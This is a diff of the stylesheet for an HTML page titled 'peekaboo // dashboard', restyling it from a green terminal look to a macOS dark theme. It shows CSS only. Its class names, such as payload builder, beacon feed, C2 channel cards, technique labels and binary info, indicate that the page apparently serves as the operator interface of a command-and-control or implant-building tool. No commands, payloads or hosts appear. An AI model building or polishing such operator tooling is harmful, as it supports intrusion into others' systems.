@@ -2,584 +2,924 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>peekaboo // dashboard</title>
 <style>
   :root {
-    --bg:     #0d0d0d;
-    --bg2:    #141414;
-    --bg3:    #1a1a1a;
-    --border: #2a2a2a;
-    --green:  #39ff14;
-    --green2: #00c853;
-    --red:    #ff1744;
-    --yellow: #ffd600;
-    --blue:   #40c4ff;
-    --purple: #e040fb;
-    --orange: #ff6d00;
-    --text:   #e0e0e0;
-    --dim:    #666;
-    --font:   'Courier New', Courier, monospace;
-    --fs:     32px;
-    --gap:    1px;
-    --radius: 2px;
+    /* macOS Monterey dark palette */
+    --bg:       #1C1C1E;
+    --bg2:      #2C2C2E;
+    --bg3:      #3A3A3C;
+    --bg4:      #48484A;
+    --sep:      #38383A;
+    --text:     #FFFFFF;
+    --text2:    #EBEBF5CC;
+    --dim:      #8E8E93;
+    --purple:   #BF5AF2;
+    --blue:     #0A84FF;
+    --green:    #30D158;
+    --red:      #FF453A;
+    --yellow:   #FFD60A;
+    --orange:   #FF9F0A;
+    --cyan:     #5AC8F5;
+    --pink:     #FF375F;
+    --sidebar-w: 220px;
+    --header-h:  54px;
+    --radius:    10px;
+    --radius-sm: 6px;
+    --font: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+    --mono: 'SF Mono', 'Fira Code', 'Courier New', monospace;
   }
 
-  *, *::before, *::after {
-    -webkit-box-sizing: border-box;
-    box-sizing: border-box;
-    margin: 0; padding: 0;
-  }
-  html { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; scroll-behavior: smooth; }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
   body {
     background: var(--bg);
     color: var(--text);
     font-family: var(--font);
-    font-size: var(--fs);
+    font-size: 14px;
     line-height: 1.5;
     min-height: 100vh;
-    min-height: -webkit-fill-available;
     overflow-x: hidden;
     -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
   }
 
   /* ── animations ── */
-  @-webkit-keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
-  @keyframes pulse          { 0%,100%{opacity:1} 50%{opacity:.4} }
-  @-webkit-keyframes spin   { to{-webkit-transform:rotate(360deg);transform:rotate(360deg)} }
-  @keyframes spin           { to{transform:rotate(360deg)} }
-  @-webkit-keyframes fadeIn { from{opacity:0;-webkit-transform:translateY(6px)} to{opacity:1;-webkit-transform:translateY(0)} }
-  @keyframes fadeIn         { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes pulse    { 0%,100%{opacity:1} 50%{opacity:.4} }
+  @keyframes spin     { to{transform:rotate(360deg)} }
+  @keyframes fadeIn   { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes slideIn  { from{opacity:0;transform:translateX(-8px)} to{opacity:1;transform:translateX(0)} }
 
-  /* ── header ── */
-  header {
+  /* ── layout ── */
+  .layout {
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* ── sidebar ── */
+  .sidebar {
+    width: var(--sidebar-w);
     background: var(--bg2);
-    border-bottom: 1px solid var(--border);
-    padding: clamp(10px,2vw,18px) clamp(12px,3vw,28px);
-    display: -webkit-box; display: -ms-flexbox; display: flex;
-    -ms-flex-wrap: wrap; flex-wrap: wrap;
-    -webkit-box-align: center; -ms-flex-align: center; align-items: center;
-    gap: clamp(12px,2vw,24px);
-  }
-  .logo { color:var(--green); font-size:clamp(12px,1.4vw,20px); line-height:1.3; white-space:pre; text-shadow:0 0 8px var(--green); }
-  .header-meta { display:-webkit-box;display:-ms-flexbox;display:flex; -webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column; gap:4px; min-width:0; }
-  .header-meta h1 { color:var(--green); font-size:clamp(16px,2vw,var(--fs)); letter-spacing:2px; text-transform:uppercase; white-space:nowrap; }
-  .header-meta .sub { color:var(--dim); font-size:clamp(11px,1.2vw,calc(var(--fs)*.6)); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-  .status-dot { width:clamp(6px,.7vw,10px); height:clamp(6px,.7vw,10px); border-radius:50%; background:var(--green); display:inline-block; margin-right:6px; box-shadow:0 0 6px var(--green); -webkit-animation:pulse 2s infinite; animation:pulse 2s infinite; vertical-align:middle; }
-
-  /* ── top grid: 3 columns ── */
-  .main-top {
-    display:-ms-grid; display:grid;
-    -ms-grid-columns: minmax(200px,22%) 1fr minmax(240px,26%);
-    grid-template-columns: minmax(200px,22%) 1fr minmax(240px,26%);
-    grid-template-areas: "modules builder beacons";
-    gap: var(--gap);
-    background: var(--border);
-    width: 100%;
-  }
-  .panel-modules { -ms-grid-row:1;-ms-grid-column:1; grid-area:modules; }
-  .panel-builder { -ms-grid-row:1;-ms-grid-column:2; grid-area:builder; }
-  .panel-beacons { -ms-grid-row:1;-ms-grid-column:3; grid-area:beacons; }
-
-  /* ── bottom grid: C2 Demo | Chat ── */
-  .main-bottom {
-    display:-ms-grid; display:grid;
-    -ms-grid-columns: 1fr 1fr;
-    grid-template-columns: 1fr 1fr;
-    grid-template-areas: "c2demo chat";
-    gap: var(--gap);
-    background: var(--border);
-    width: 100%;
-    margin-top: var(--gap);
-  }
-  .panel-c2demo { -ms-grid-row:1;-ms-grid-column:1; grid-area:c2demo; }
-  .panel-chat   { -ms-grid-row:1;-ms-grid-column:2; grid-area:chat; }
-
-  /* ── panel base ── */
-  .panel {
-    background: var(--bg);
-    padding: clamp(12px,1.5vw,18px);
-    overflow: auto;
-    min-width: 0;
-    max-height: clamp(320px,45vh,560px);
+    border-right: 1px solid var(--sep);
+    display: flex;
+    flex-direction: column;
+    position: fixed;
+    top: 0; left: 0; bottom: 0;
+    z-index: 100;
     overflow-y: auto;
   }
-  .panel-bottom { max-height: clamp(360px,48vh,600px); }
 
-  .panel-title {
-    color: var(--green);
-    font-size: clamp(12px,1.4vw,calc(var(--fs)*.75));
-    letter-spacing: 2px;
+  .sidebar-brand {
+    padding: 20px 16px 16px;
+    border-bottom: 1px solid var(--sep);
+  }
+  .sidebar-brand .cat {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--purple);
+    white-space: pre;
+    line-height: 1.2;
+    text-shadow: 0 0 12px var(--purple);
+    margin-bottom: 8px;
+  }
+  .sidebar-brand .brand-name {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: 0.5px;
+  }
+  .sidebar-brand .brand-sub {
+    font-size: 11px;
+    color: var(--dim);
+    margin-top: 2px;
+  }
+
+  .sidebar-section {
+    padding: 8px 0;
+    border-bottom: 1px solid var(--sep);
+  }
+  .sidebar-section-label {
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--dim);
     text-transform: uppercase;
-    border-bottom: 1px solid var(--border);
-    padding-bottom: 8px;
+    letter-spacing: 0.8px;
+    padding: 4px 16px 6px;
+  }
+
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 9px 16px;
+    cursor: pointer;
+    border-radius: 0;
+    transition: background .15s, color .15s;
+    color: var(--text2);
+    font-size: 14px;
+    font-weight: 400;
+    position: relative;
+    user-select: none;
+  }
+  .nav-item:hover {
+    background: rgba(255,255,255,0.06);
+    color: var(--text);
+  }
+  .nav-item.active {
+    background: rgba(191,90,242,0.15);
+    color: var(--purple);
+    font-weight: 500;
+  }
+  .nav-item.active::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 4px; bottom: 4px;
+    width: 3px;
+    background: var(--purple);
+    border-radius: 0 2px 2px 0;
+  }
+  .nav-icon {
+    font-size: 16px;
+    width: 20px;
+    text-align: center;
+    flex-shrink: 0;
+  }
+  .nav-badge {
+    margin-left: auto;
+    font-size: 11px;
+    padding: 1px 6px;
+    border-radius: 10px;
+    background: var(--bg3);
+    color: var(--dim);
+    font-weight: 500;
+  }
+  .nav-badge.live {
+    background: rgba(48,209,88,0.2);
+    color: var(--green);
+  }
+
+  .sidebar-footer {
+    margin-top: auto;
+    padding: 12px 16px;
+    font-size: 11px;
+    color: var(--dim);
+    border-top: 1px solid var(--sep);
+  }
+  .sidebar-footer .status-dot {
+    display: inline-block;
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 6px var(--green);
+    animation: pulse 2s infinite;
+    vertical-align: middle;
+    margin-right: 5px;
+  }
+
+  /* ── main content ── */
+  .main {
+    margin-left: var(--sidebar-w);
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  .topbar {
+    height: var(--header-h);
+    background: rgba(28,28,30,0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--sep);
+    display: flex;
+    align-items: center;
+    padding: 0 24px;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 50;
+  }
+  .topbar-title {
+    font-size: 17px;
+    font-weight: 600;
+    color: var(--text);
+  }
+  .topbar-sub {
+    font-size: 12px;
+    color: var(--dim);
+  }
+  #clock {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--dim);
+  }
+
+  /* ── page / section ── */
+  .page {
+    display: none;
+    padding: 24px;
+    animation: fadeIn .2s ease;
+    flex: 1;
+  }
+  .page.active { display: block; }
+
+  /* ── cards ── */
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius);
+    padding: 18px 20px;
+    margin-bottom: 16px;
+  }
+  .card-title {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--dim);
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-title .icon { font-size: 15px; }
+
+  .page-grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+  }
+  .page-grid-3 {
+    display: grid;
+    grid-template-columns: repeat(3,1fr);
+    gap: 16px;
+  }
+
+  /* ── form elements ── */
+  .form-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
     margin-bottom: 12px;
+    flex-wrap: wrap;
   }
-  .panel-title span { color:var(--dim); font-size:clamp(10px,1vw,calc(var(--fs)*.55)); margin-left:6px; }
-  .panel-title .badge { font-size:clamp(9px,.9vw,calc(var(--fs)*.45)); padding:2px 6px; border-radius:var(--radius); margin-left:6px; vertical-align:middle; }
-  .badge-green  { background:var(--green2); color:#000; }
-  .badge-yellow { background:var(--yellow); color:#000; }
-  .badge-dim    { background:var(--border); color:var(--dim); }
-
-  /* ── module tags ── */
-  .module-group { margin-bottom:14px; }
-  .module-group-label { color:var(--blue); font-size:clamp(10px,1vw,calc(var(--fs)*.55)); letter-spacing:1px; text-transform:uppercase; margin-bottom:5px; }
-  .module-tag { display:inline-block; background:var(--bg3); border:1px solid var(--border); color:var(--text); padding:3px 8px; margin:2px; font-size:clamp(10px,1vw,calc(var(--fs)*.52)); border-radius:var(--radius); cursor:default; -webkit-transition:border-color .15s,color .15s; transition:border-color .15s,color .15s; }
-  .module-tag:hover { border-color:var(--green); color:var(--green); }
-
-  /* ── forms ── */
-  .form-row { display:-webkit-box;display:-ms-flexbox;display:flex; -webkit-box-align:center;-ms-flex-align:center;align-items:center; gap:10px; margin-bottom:10px; -ms-flex-wrap:wrap;flex-wrap:wrap; }
-  .form-row label { color:var(--dim); font-size:clamp(11px,1.1vw,calc(var(--fs)*.6)); width:8em; -ms-flex-negative:0;flex-shrink:0; text-align:right; }
+  .form-row label {
+    font-size: 13px;
+    color: var(--dim);
+    width: 90px;
+    flex-shrink: 0;
+    text-align: right;
+  }
   select, input[type="text"] {
-    background:var(--bg3); border:1px solid var(--border); color:var(--text);
-    font-family:var(--font); font-size:clamp(11px,1.1vw,calc(var(--fs)*.6));
-    padding:6px 10px; -webkit-box-flex:1;-ms-flex:1 1 120px;flex:1 1 120px;
-    min-width:0; outline:none;
-    -webkit-appearance:none; -moz-appearance:none; appearance:none;
-    border-radius:var(--radius);
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 13px;
+    padding: 7px 11px;
+    flex: 1 1 160px;
+    min-width: 0;
+    outline: none;
+    appearance: none;
+    border-radius: var(--radius-sm);
+    transition: border-color .15s;
   }
-  select:focus, input:focus { border-color:var(--green); }
-  select option { background:var(--bg3); color:var(--text); }
+  select:focus, input:focus { border-color: var(--purple); }
+  select option { background: var(--bg3); color: var(--text); }
 
   /* ── buttons ── */
   .btn {
-    background:transparent; border:1px solid var(--green); color:var(--green);
-    font-family:var(--font); font-size:clamp(11px,1.1vw,calc(var(--fs)*.6));
-    padding:8px 18px; cursor:pointer; letter-spacing:1px; text-transform:uppercase;
-    border-radius:var(--radius);
-    -webkit-transition:background .15s,color .15s; transition:background .15s,color .15s;
-    white-space:nowrap;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    color: var(--text2);
+    font-family: var(--font);
+    font-size: 13px;
+    font-weight: 500;
+    padding: 7px 16px;
+    cursor: pointer;
+    border-radius: var(--radius-sm);
+    transition: background .15s, color .15s, border-color .15s;
+    white-space: nowrap;
+    user-select: none;
   }
-  .btn:hover    { background:var(--green); color:var(--bg); }
-  .btn:disabled { border-color:var(--dim); color:var(--dim); cursor:not-allowed; }
-  .btn:disabled:hover { background:transparent; }
-  .btn-red    { border-color:var(--red);    color:var(--red); }
-  .btn-red:hover    { background:var(--red);    color:var(--bg); }
-  .btn-blue   { border-color:var(--blue);   color:var(--blue); }
-  .btn-blue:hover   { background:var(--blue);   color:var(--bg); }
-  .btn-purple { border-color:var(--purple); color:var(--purple); }
-  .btn-purple:hover { background:var(--purple); color:var(--bg); }
-  .btn-orange { border-color:var(--orange); color:var(--orange); }
-  .btn-orange:hover { background:var(--orange); color:var(--bg); }
-  .btn-row { display:-webkit-box;display:-ms-flexbox;display:flex; gap:8px; margin-top:6px; -ms-flex-wrap:wrap;flex-wrap:wrap; }
+  .btn:hover { background: var(--bg4); color: var(--text); }
+  .btn:disabled { opacity: .4; cursor: not-allowed; }
+  .btn:disabled:hover { background: var(--bg3); color: var(--text2); }
+
+  .btn-primary  { background: var(--purple); border-color: var(--purple); color: #fff; }
+  .btn-primary:hover { background: #CF6BFF; border-color: #CF6BFF; }
+  .btn-blue     { background: rgba(10,132,255,.15); border-color: var(--blue);   color: var(--blue); }
+  .btn-blue:hover { background: rgba(10,132,255,.28); }
+  .btn-green    { background: rgba(48,209,88,.15);  border-color: var(--green);  color: var(--green); }
+  .btn-green:hover { background: rgba(48,209,88,.28); }
+  .btn-red      { background: rgba(255,69,58,.15);  border-color: var(--red);    color: var(--red); }
+  .btn-red:hover { background: rgba(255,69,58,.28); }
+  .btn-orange   { background: rgba(255,159,10,.15); border-color: var(--orange); color: var(--orange); }
+  .btn-orange:hover { background: rgba(255,159,10,.28); }
+  .btn-cyan     { background: rgba(90,200,245,.15); border-color: var(--cyan);   color: var(--cyan); }
+  .btn-cyan:hover { background: rgba(90,200,245,.28); }
+
+  .btn-row { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
 
   /* ── build output ── */
   #build-output {
-    background:var(--bg2); border:1px solid var(--border); padding:10px;
-    font-size:clamp(10px,.9vw,calc(var(--fs)*.48)); line-height:1.6;
-    min-height:120px; max-height:clamp(160px,22vh,300px);
-    overflow-y:auto; white-space:pre-wrap; word-break:break-all;
-    color:#aaa; margin-top:12px; border-radius:var(--radius);
+    background: var(--bg);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius-sm);
+    padding: 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.6;
+    min-height: 120px;
+    max-height: 280px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+    color: var(--dim);
+    margin-top: 14px;
   }
-  #build-output .ok  { color:var(--green2); }
-  #build-output .err { color:var(--red); }
-  #build-output .inf { color:var(--blue); }
-  #build-output .wrn { color:var(--yellow); }
+  #build-output .ok  { color: var(--green); }
+  #build-output .err { color: var(--red); }
+  #build-output .inf { color: var(--cyan); }
+  #build-output .wrn { color: var(--yellow); }
 
-  /* ── build status badge ── */
-  .build-status { display:inline-block; padding:2px 8px; font-size:clamp(9px,.9vw,calc(var(--fs)*.48)); border-radius:var(--radius); margin-left:6px; vertical-align:middle; }
-  .build-status.success { background:#00c853; color:#000; }
-  .build-status.failed  { background:var(--red); color:#fff; }
-  .build-status.running { background:var(--yellow); color:#000; -webkit-animation:pulse 1s infinite; animation:pulse 1s infinite; }
-  .build-status.queued  { background:var(--blue); color:#000; }
-  .build-status.timeout { background:var(--orange); color:#fff; }
-  .build-status.error   { background:var(--red); color:#fff; }
-  .build-status.idle    { background:var(--border); color:var(--dim); }
-
-  /* ── beacon feed ── */
-  .beacon-item { border:1px solid var(--border); padding:7px 10px; margin-bottom:7px; background:var(--bg2); border-radius:var(--radius); overflow:hidden; -webkit-animation:fadeIn .3s ease; animation:fadeIn .3s ease; }
-  .beacon-item .b-from { color:var(--green); font-size:clamp(10px,1vw,calc(var(--fs)*.52)); }
-  .beacon-item .b-time { color:var(--dim); font-size:clamp(9px,.9vw,calc(var(--fs)*.46)); float:right; }
-  .beacon-item .b-text { margin-top:4px; font-size:clamp(10px,.95vw,calc(var(--fs)*.5)); color:var(--text); max-height:70px; overflow-y:auto; white-space:pre-wrap; word-break:break-word; }
-  .beacon-empty { color:var(--dim); font-size:clamp(11px,1.1vw,calc(var(--fs)*.55)); text-align:center; padding:18px 0; }
-
-  /* ── C2 demo ── */
-  .c2-channel-grid {
-    display:-ms-grid; display:grid;
-    -ms-grid-columns: 1fr 1fr;
-    grid-template-columns: 1fr 1fr;
-    gap: 10px;
-    margin-bottom: 14px;
+  /* ── status badges ── */
+  .badge {
+    display: inline-block;
+    font-size: 11px;
+    font-weight: 600;
+    padding: 2px 8px;
+    border-radius: 20px;
   }
-  .c2-card {
-    background: var(--bg2);
-    border: 1px solid var(--border);
+  .badge-purple { background: rgba(191,90,242,.2);  color: var(--purple); }
+  .badge-green  { background: rgba(48,209,88,.2);   color: var(--green); }
+  .badge-yellow { background: rgba(255,214,10,.2);  color: var(--yellow); }
+  .badge-red    { background: rgba(255,69,58,.2);   color: var(--red); }
+  .badge-blue   { background: rgba(10,132,255,.2);  color: var(--blue); }
+  .badge-dim    { background: var(--bg3);            color: var(--dim); }
+
+  .build-status { display: inline-flex; align-items: center; gap: 5px; font-size: 12px; font-weight: 500; padding: 3px 10px; border-radius: 20px; }
+  .build-status.success { background: rgba(48,209,88,.2);  color: var(--green); }
+  .build-status.failed  { background: rgba(255,69,58,.2);  color: var(--red); }
+  .build-status.running { background: rgba(255,214,10,.2); color: var(--yellow); animation: pulse 1s infinite; }
+  .build-status.queued  { background: rgba(10,132,255,.2); color: var(--blue); }
+  .build-status.timeout { background: rgba(255,159,10,.2); color: var(--orange); }
+  .build-status.error   { background: rgba(255,69,58,.2);  color: var(--red); }
+  .build-status.idle    { background: var(--bg3);           color: var(--dim); }
+
+  /* ── beacon items ── */
+  .beacon-item {
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius-sm);
     padding: 10px 12px;
-    border-radius: var(--radius);
-    -webkit-transition: border-color .2s; transition: border-color .2s;
+    margin-bottom: 8px;
+    animation: fadeIn .3s ease;
   }
-  .c2-card:hover { border-color: var(--green); }
-  .c2-card .c2-name { font-size:clamp(11px,1.1vw,calc(var(--fs)*.6)); color:var(--text); letter-spacing:1px; text-transform:uppercase; margin-bottom:6px; }
-  .c2-card .c2-status { font-size:clamp(9px,.9vw,calc(var(--fs)*.46)); margin-bottom:8px; }
-  .c2-card .c2-technique { font-size:clamp(9px,.85vw,calc(var(--fs)*.44)); color:var(--dim); margin-top:4px; }
+  .beacon-item .b-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
+  .beacon-item .b-from { color: var(--purple); font-size: 13px; font-weight: 500; }
+  .beacon-item .b-time { color: var(--dim); font-size: 11px; font-family: var(--mono); }
+  .beacon-item .b-text { font-size: 13px; color: var(--text2); white-space: pre-wrap; word-break: break-word; max-height: 80px; overflow-y: auto; }
+  .beacon-empty { color: var(--dim); font-size: 13px; text-align: center; padding: 28px 0; }
+
+  /* ── C2 channel cards ── */
+  .c2-card {
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius);
+    padding: 14px 16px;
+    transition: border-color .2s;
+  }
+  .c2-card:hover { border-color: var(--purple); }
+  .c2-card .c2-name { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+  .c2-card .c2-status { font-size: 12px; color: var(--dim); margin-bottom: 10px; min-height: 18px; }
+  .c2-card .c2-technique { font-size: 11px; color: var(--dim); margin-top: 8px; font-family: var(--mono); }
   .c2-result {
-    background: var(--bg2); border: 1px solid var(--border);
-    padding: 8px 10px; margin-top: 10px;
-    font-size: clamp(10px,.95vw,calc(var(--fs)*.5));
-    white-space: pre-wrap; word-break: break-all;
-    border-radius: var(--radius);
-    max-height: 120px; overflow-y: auto;
-    -webkit-animation: fadeIn .3s ease; animation: fadeIn .3s ease;
+    background: var(--bg2);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius-sm);
+    padding: 10px 12px;
+    margin-top: 12px;
+    font-size: 12px;
+    font-family: var(--mono);
+    white-space: pre-wrap;
+    word-break: break-all;
+    max-height: 140px;
+    overflow-y: auto;
+    animation: fadeIn .3s ease;
   }
-  .c2-result.ok  { border-color: var(--green2); color: var(--green2); }
+  .c2-result.ok  { border-color: var(--green);  color: var(--green); }
   .c2-result.err { border-color: var(--red);    color: var(--red); }
 
   #binary-info {
-    font-size: clamp(10px,.95vw,calc(var(--fs)*.5));
-    color: var(--blue);
-    margin-bottom: 10px;
-    padding: 6px 10px;
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: var(--radius);
+    font-size: 13px;
+    font-family: var(--mono);
+    color: var(--cyan);
+    padding: 10px 14px;
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius-sm);
+    margin-bottom: 16px;
   }
 
-  /* ── chat panel ── */
+  /* ── chat ── */
   .chat-messages {
-    height: clamp(200px,28vh,380px);
+    height: clamp(260px,42vh,480px);
     overflow-y: auto;
-    padding: 8px;
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: var(--radius);
-    margin-bottom: 10px;
-    display: -webkit-box; display: -ms-flexbox; display: flex;
-    -webkit-box-orient: vertical; -webkit-box-direction: normal;
-    -ms-flex-direction: column; flex-direction: column;
-    gap: 10px;
+    padding: 12px;
+    background: var(--bg);
+    border: 1px solid var(--sep);
+    border-radius: var(--radius-sm);
+    margin-bottom: 12px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
   }
-  .msg { -webkit-animation: fadeIn .25s ease; animation: fadeIn .25s ease; }
+  .msg { animation: fadeIn .25s ease; }
   .msg-user {
-    -ms-flex-item-align: end; align-self: flex-end;
-    background: var(--bg3); border: 1px solid var(--border);
-    padding: 7px 12px; border-radius: var(--radius);
-    max-width: 85%;
-    font-size: clamp(11px,1.05vw,calc(var(--fs)*.58));
-    color: var(--text);
+    align-self: flex-end;
+    background: var(--purple);
+    padding: 9px 14px;
+    border-radius: 14px 14px 3px 14px;
+    max-width: 80%;
+    font-size: 13px;
+    color: #fff;
   }
   .msg-assistant {
-    -ms-flex-item-align: start; align-self: flex-start;
-    background: #0d1f0d; border: 1px solid #1a3d1a;
-    padding: 7px 12px; border-radius: var(--radius);
-    max-width: 92%;
-    font-size: clamp(11px,1.05vw,calc(var(--fs)*.58));
-    color: var(--text);
-    white-space: pre-wrap; word-break: break-word;
+    align-self: flex-start;
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    padding: 9px 14px;
+    border-radius: 3px 14px 14px 14px;
+    max-width: 88%;
+    font-size: 13px;
+    color: var(--text2);
+    white-space: pre-wrap;
+    word-break: break-word;
   }
-  .msg-assistant .msg-label { color: var(--green); font-size: .85em; margin-bottom: 4px; letter-spacing: 1px; }
-  .msg-user .msg-label { color: var(--dim); font-size: .85em; margin-bottom: 4px; letter-spacing: 1px; }
-  .msg-thinking { color: var(--dim); font-style: italic; font-size: .85em; }
+  .msg-label { font-size: 11px; font-weight: 600; margin-bottom: 5px; letter-spacing: 0.3px; }
+  .msg-user .msg-label     { color: rgba(255,255,255,.7); }
+  .msg-assistant .msg-label { color: var(--purple); }
 
   .chat-input-row {
-    display: -webkit-box; display: -ms-flexbox; display: flex;
-    gap: 8px;
-    -webkit-box-align: end; -ms-flex-align: end; align-items: flex-end;
+    display: flex;
+    gap: 10px;
+    align-items: flex-end;
   }
   textarea#chat-input {
-    -webkit-box-flex: 1; -ms-flex: 1; flex: 1;
-    background: var(--bg3); border: 1px solid var(--border);
-    color: var(--text); font-family: var(--font);
-    font-size: clamp(11px,1.05vw,calc(var(--fs)*.58));
-    padding: 8px 10px; resize: vertical; min-height: 52px; max-height: 140px;
-    border-radius: var(--radius); outline: none;
+    flex: 1;
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 13px;
+    padding: 9px 12px;
+    resize: vertical;
+    min-height: 54px;
+    max-height: 140px;
+    border-radius: var(--radius-sm);
+    outline: none;
+    transition: border-color .15s;
   }
-  textarea#chat-input:focus { border-color: var(--green); }
+  textarea#chat-input:focus { border-color: var(--purple); }
 
-  .kb-bar {
-    font-size: clamp(9px,.85vw,calc(var(--fs)*.46));
+  .quick-btns { display: flex; gap: 6px; margin-top: 10px; flex-wrap: wrap; }
+  .quick-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 14px;
+    background: var(--bg3);
+    border: 1px solid var(--sep);
     color: var(--dim);
-    margin-bottom: 8px;
-    padding: 4px 8px;
-    background: var(--bg2);
-    border: 1px solid var(--border);
-    border-radius: var(--radius);
-    display: -webkit-box; display: -ms-flexbox; display: flex;
-    -webkit-box-pack: justify; -ms-flex-pack: justify; justify-content: space-between;
-    -webkit-box-align: center; -ms-flex-align: center; align-items: center;
-    -ms-flex-wrap: wrap; flex-wrap: wrap; gap: 6px;
+    cursor: pointer;
+    transition: background .15s, color .15s, border-color .15s;
   }
+  .quick-btn:hover { background: rgba(191,90,242,.15); border-color: var(--purple); color: var(--purple); }
+
+  /* ── module tags ── */
+  .module-group { margin-bottom: 18px; }
+  .module-group-label { font-size: 11px; font-weight: 600; color: var(--blue); text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 8px; }
+  .module-tag {
+    display: inline-block;
+    background: var(--bg3);
+    border: 1px solid var(--sep);
+    color: var(--text2);
+    padding: 4px 10px;
+    margin: 3px;
+    font-size: 12px;
+    border-radius: 6px;
+    cursor: default;
+    transition: border-color .15s, color .15s;
+  }
+  .module-tag:hover { border-color: var(--purple); color: var(--purple); }
 
   /* ── history ── */
-  .history-item { display:-webkit-box;display:-ms-flexbox;display:flex; gap:8px; -webkit-box-align:center;-ms-flex-align:center;align-items:center; padding:6px 0; border-bottom:1px solid var(--border); font-size:clamp(10px,.95vw,calc(var(--fs)*.5)); -ms-flex-wrap:wrap;flex-wrap:wrap; }
-  .history-item:last-child { border-bottom:none; }
-  .history-id     { color:var(--yellow); width:5em; -ms-flex-negative:0;flex-shrink:0; }
-  .history-params { color:var(--dim); -webkit-box-flex:1;-ms-flex:1;flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; min-width:0; }
-  .history-time   { color:var(--dim); font-size:clamp(9px,.85vw,calc(var(--fs)*.46)); -ms-flex-negative:0;flex-shrink:0; }
-
-  /* ── tabs ── */
-  .tabs { display:-webkit-box;display:-ms-flexbox;display:flex; border-bottom:1px solid var(--border); margin-bottom:12px; -ms-flex-wrap:wrap;flex-wrap:wrap; }
-  .tab { padding:6px 14px; font-size:clamp(11px,1.1vw,calc(var(--fs)*.58)); color:var(--dim); cursor:pointer; border-bottom:2px solid transparent; margin-bottom:-1px; text-transform:uppercase; letter-spacing:1px; -webkit-transition:color .15s;transition:color .15s; white-space:nowrap; }
-  .tab.active  { color:var(--green); border-bottom-color:var(--green); }
-  .tab:hover   { color:var(--text); }
-  .tab-content { display:none; }
-  .tab-content.active { display:block; }
+  .history-item {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+    padding: 8px 0;
+    border-bottom: 1px solid var(--sep);
+    font-size: 13px;
+    flex-wrap: wrap;
+  }
+  .history-item:last-child { border-bottom: none; }
+  .history-id     { color: var(--yellow); font-family: var(--mono); font-size: 12px; width: 4.5em; flex-shrink: 0; }
+  .history-params { color: var(--dim); flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; font-family: var(--mono); font-size: 11px; }
+  .history-time   { color: var(--dim); font-size: 11px; flex-shrink: 0; font-family: var(--mono); }
 
   /* ── misc ── */
-  .spinner { display:inline-block; width:12px; height:12px; border:2px solid var(--border); border-top-color:var(--green); border-radius:50%; -webkit-animation:spin .6s linear infinite; animation:spin .6s linear infinite; vertical-align:middle; margin-right:6px; }
-  .sep { height:1px; background:var(--border); margin:12px 0; }
-  .text-green  { color:var(--green); }
-  .text-dim    { color:var(--dim); }
-  .text-blue   { color:var(--blue); }
-  .text-purple { color:var(--purple); }
-  .dot-ok  { color:var(--green2); }
-  .dot-err { color:var(--red); }
